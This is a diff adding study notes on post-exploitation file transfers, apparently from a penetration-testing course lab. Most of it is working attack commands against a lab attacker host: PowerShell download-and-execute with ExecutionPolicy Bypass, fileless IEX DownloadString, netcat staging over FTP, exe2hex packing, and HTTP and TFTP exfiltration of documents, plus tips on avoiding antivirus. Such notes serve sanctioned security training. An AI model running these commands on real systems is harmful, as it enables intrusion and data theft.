@@ -1,0 +1,110 @@
+------------------
+NOTES
+------------------
+
+Post exploitation
+	once a machine is compromised
+		priv esc
+			lateral and vertical
+		persistence (backdoors)
+		cleaning evidence of an attack
+		uploading files and tools
+
+File Transfers
+	Considerations
+		Dangers of transferring attack tools
+			can be abused by malicious parties
+				document uploads and such to avoid leaving tools on machines
+			AV can scan the filesystem and file a common tool
+				signal the sysadmin -> lose a shell or end the engagement
+			use native tools once a system is compromisedW
+
+		Installing Pure-FTPd
+			On Kali machine
+				sudo apt update && sudo apt install pure-ftpd
+				run ./ftp_setup.sh (found in this dir)
+
+		upgrade low level shell with the classic
+			python -c 'import pty; pty.spawn("/bin/bash")'
+
+	Transferring files with Windows Hosts
+		Non-Interactive FTP Download
+			Windows hosts ship with an FTP client
+
+		Example:
+			From Kali:
+				# Place the nc.exe file in the dir you want
+				sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
+				sudo systemctl restart pure-ftpd
+			From Windows:
+				echo open 10.11.0.4 21> ftp.txt
+				echo USER offsec>> ftp.txt
+				echo lab>> ftp.txt
+				echo bin >> ftp.txt
+				echo GET nc.exe >> ftp.txt
+				echo bye >> ftp.txt
+
+				ftp -v -n -s:ftp.txtS
+					-v = surpress display of remote server
+					-n = surpress auto login
+					-s = provide a file with FTP cmds
+
+	Windows Downloading Files with Scripting Langs
+		paste ./wget.vbs_commands into a terminal to create a vbscript to download a file
+		cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+
+		Powershell
+			echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+			echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
+			echo $file = "new-exploit.exe" >>wget.ps1
+			echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+			powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+				-ExecutionPolicy Bypass = run the script hehe
+				-NoLogo and -NonInteractive = hide the powershell banner and suppress the PS prompt
+				-NoProfile = prevent PS from loading the default profile
+
+			powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+				oneliner
+		Run file without writing it to disk
+			powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+			Combines IEX and DownloadString
+
+	Windows Downloads with exe2hex and Powershell
+		compress the binary file, convert it to a hex string, embed the hex string into a windows script
+
+		From kali:
+			# executable packer
+			# Decreases size by ~50%
+			upx -9 nc.exe
+			# Convert the exe into a script
+			exe2hex -x nc.exe -p nc.cmd
+			# Just look at it lol
+			head nc.cmd
+
+		From Windows:
+			Download the script and run it
+
+	Windows Uploads Using Windows Scripting Langs
+		can exfil data as long as HTTP outbound is enables (usually always is)
+
+		serve ./upload.php from kali box
+			sudo mkdir /var/www/uploads
+			sudo chown www-data: /var/www/uploads
+
+		from windows:
+			powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+
+	Uploading Files with TFTP
+		Dino bones old windows system dont have powershell installed by default and may need other method of exfil
+		TFTP UDP based file transfer protocol
+
+		Installing and configuring on Kali:
+			sudo apt update && sudo apt install atftp
+			sudo mkdir /tftp
+			sudo chown nobody: /tftp
+			sudo atftpd --daemon --port 69 /tftp
+
+		From Windows:
+			tftp -i 10.11.0.4 put important.docx
+				-i = binary image transfer
